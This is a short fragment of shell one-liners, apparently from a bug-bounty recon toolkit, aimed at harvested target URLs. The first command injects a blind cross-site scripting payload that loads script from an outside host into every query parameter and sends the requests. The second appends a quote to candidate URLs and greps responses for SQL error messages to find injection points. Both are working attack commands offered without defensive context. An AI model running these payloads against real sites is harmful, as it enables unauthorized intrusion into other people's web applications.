...
cat ~/scripts/target/gf.txt | grep "=" | qsreplace '<Script /Src=https://X55.is?1=17907></Script>' | while read host do; do curl --silent --insecure $host > /dev/null; done;
...
cat ~/scripts/target/waybackurls.txt | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | egrep -qs "(mysql_fetch_array|SQL syntax|server error|sql|SQL)" && echo "possible sql injection here $host" ; done
